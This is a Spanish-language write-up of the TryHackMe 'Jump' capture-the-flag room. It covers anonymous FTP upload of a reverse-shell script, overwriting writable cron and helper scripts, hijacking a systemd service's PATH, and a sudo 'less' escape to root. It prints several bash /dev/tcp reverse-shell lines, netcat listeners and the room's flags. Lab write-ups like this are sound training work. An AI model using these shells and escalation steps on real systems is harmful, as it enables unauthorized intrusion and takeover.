# Jump — mi write-up

Room de **TryHackMe** (easy). Linux: FTP anónimo → pipeline de recon → cadena de privesc entre usuarios (`recon_user` → `dev_user` → `monitor_user` → `ops_user` → root).

Room: https://tryhackme.com/room/jump

---

## Cómo empecé

Hacemos reconocimiento con nmap, encontramos los puertos 21 y 22.

```bash
sudo nmap -sS -Pn -p- --min-rate 1000 <IP>
```

![nmap -p- — 21 ftp y 22 ssh](screenshots/01-nmap.png)

Hacemos otro reconocimiento para sacar más información de los 2 puertos encontrados, vemos que FTP acepta login anónimo.

```bash
sudo nmap -sC -sV -p21,22 <IP>
```

![nmap -sC -sV — vsftpd 3.0.5, anonymous login, incoming escribible](screenshots/02-nmap-services.png)

---

## FTP anónimo

Nos logueamos como anónimo.

```bash
ftp <IP>
# Name: anonymous
# Password: (vacío / Enter)
```

![ftp — login anonymous](screenshots/03-ftp-anon.png)

Encontramos un `README.txt` en un directorio.

![ftp — cd pub, README.txt](screenshots/04-ftp-pub.png)

Lo descargamos.

```
ftp> get README.txt
```

![ftp — get README.txt](screenshots/05-ftp-get-readme.png)

Leemos el txt. Entiendo que todo el trabajo de reconocimiento tiene que estar situado en `incoming/`, y que son procesados, lo cual me hace deducir que todo lo que llega ahí se ejecuta.

![README.txt — recon pipeline, incoming/](screenshots/06-readme.png)

---

## Reverse shell como recon_user

Creamos un archivo con una reverse shell para poder subirlo al directorio.

```bash
bash -i >& /dev/tcp/<TU-IP>/1337 0>&1
```

![script.sh — reverse shell](screenshots/07-script-sh.png)

Lo subimos.

```
ftp> cd incoming
ftp> put script.sh
```

![ftp — put script.sh en incoming](screenshots/08-ftp-put.png)

Y nos llega la conexión como el usuario `recon_user`.

```bash
nc -lvnp 1337
```

![nc — shell recon_user](screenshots/09-rev-recon.png)

Encontramos la primera flag.

![flag recon_user](screenshots/10-flag-recon.png)

```
THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}
```

Encontramos la segunda flag en el directorio de `dev_user`.

![flag en /home/dev_user](screenshots/11-flag-dev.png)

```
THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
```

---

## pspy y cron → dev_user

Usamos una herramienta que se llama **pspy64**. Levantamos un servidor donde tenemos el programa guardado y desde la máquina víctima lo descargamos.

```bash
# en Kali
python3 -m http.server 80

# en la víctima
wget http://<TU-IP>/pspy64
```

![wget pspy64](screenshots/12-pspy-wget.png)

Vemos las tareas cron que se ejecutan.

![pspy — cron backup.sh y scan_uploads.sh](screenshots/13-cron-pspy.png)

Luego de hacer reconocimiento, veo que puedo escribir en el archivo `backup.sh`, y le pongo una reverse shell.

```bash
cat > /opt/dev/backup.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<TU-IP>/1400 0>&1
EOF
```

![backup.sh — reverse shell](screenshots/14-backup-sh.png)

Ponemos en escucha con netcat y se conecta la reverse shell como `dev_user`.

---

## PATH de healthcheck → monitor_user

Una vez dentro hacemos reconocimiento, y luego consulto las variables de entorno con las que systemd ejecuta `healthcheck.service`. Vemos que lo ejecuta con este path `/opt/dev/bin/ps`.

```bash
systemctl show healthcheck.service -p Environment
# Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
```

![systemctl — PATH /opt/dev/bin](screenshots/15-healthcheck-path.png)

Entonces modificamos `ps` y ponemos una reverse shell, y damos permiso de ejecución con `chmod +x`.

```bash
cat > /opt/dev/bin/ps <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<TU-IP>/1500 0>&1
EOF
chmod +x /opt/dev/bin/ps
```

![modificar /opt/dev/bin/ps](screenshots/16-modify-ps.png)

Nos llega la conexión con el usuario `monitor_user`. La flag la encontramos en el directorio del usuario.

```bash
nc -lvnp 1500
```

![nc — shell monitor_user](screenshots/17-rev-monitor.png)

---

## deploy.sh → ops_user

El usuario `ops_user` puede ejecutar `deploy.sh`. Leemos dentro de `deploy.sh` y vemos que utiliza otro script llamado `deploy_helper.sh`.

![cat deploy.sh — llama a deploy_helper.sh](screenshots/18-deploy-sh.png)

Vemos quién puede ejecutar ese archivo y vemos que tenemos total permiso sobre él, entonces ponemos la reverse shell dentro.

```bash
ls -l /opt/app/deploy_helper.sh
cat > /opt/app/deploy_helper.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<TU-IP>/1600 0>&1
EOF
```

![deploy_helper.sh — reverse shell](screenshots/19-deploy-helper.png)

Ejecutamos el `deploy.sh`.

```bash
sudo -u ops_user /usr/local/bin/deploy.sh
```

![sudo -u ops_user deploy.sh](screenshots/20-sudo-deploy.png)

Y ganamos la rev shell como el usuario `ops_user`. La flag la encontramos en el directorio del usuario.

```bash
nc -lvnp 1600
```

![nc — shell ops_user](screenshots/21-rev-ops.png)

---

## less → root

Luego ejecutando `sudo -l` vemos que tenemos permitido ejecutar `less` como root sin contraseña. Podemos explotarlo siguiendo los pasos de GTFOBins y obtener la shell como root.

```bash
sudo less /etc/hosts
!/bin/sh
```

![GTFOBins — less, spawn shell](screenshots/22-gtfobins-less.png)

---

## Mi cadena (resumen)

```
nmap (21, 22) → FTP anonymous
  → README.txt: incoming/ se procesa / se ejecuta
  → put script.sh → nc → recon_user + flag
  → flag en /home/dev_user
  → pspy64 → cron /opt/dev/backup.sh (escribible)
  → backup.sh + nc → dev_user
  → healthcheck.service PATH=/opt/dev/bin → overwrite ps
  → nc → monitor_user + flag
  → deploy.sh llama a deploy_helper.sh (escribible)
  → sudo -u ops_user deploy.sh → ops_user + flag
  → sudo less (NOPASSWD) → GTFOBins → root
```

---

*Room educativo de TryHackMe*
